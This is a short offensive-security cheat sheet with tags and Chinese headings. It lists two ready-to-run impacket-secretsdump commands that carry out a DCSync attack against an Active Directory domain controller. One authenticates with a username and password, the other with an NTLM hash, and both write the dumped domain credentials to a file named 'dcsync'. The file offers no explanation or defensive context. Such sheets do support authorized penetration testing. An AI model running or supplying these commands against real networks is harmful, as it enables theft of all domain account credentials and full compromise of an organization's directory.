% movement, dumping creds, dcsync, impacket, secretsdump, creds

# 使用账号密码进行DCSync攻击
```sh
impacket-secretsdump -outputfile 'dcsync' -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_HOST"
```

% movement, dumping creds, dcsync, impacket, secretsdump, ntlm hash

# 使用NTLM hash进行DCSync攻击
```sh
impacket-secretsdump -outputfile 'dcsync' -hashes :"$NT_HASH" -dc-ip "$DC_IP" "$DOMAIN"/"$USER"@"$DC_HOST"
```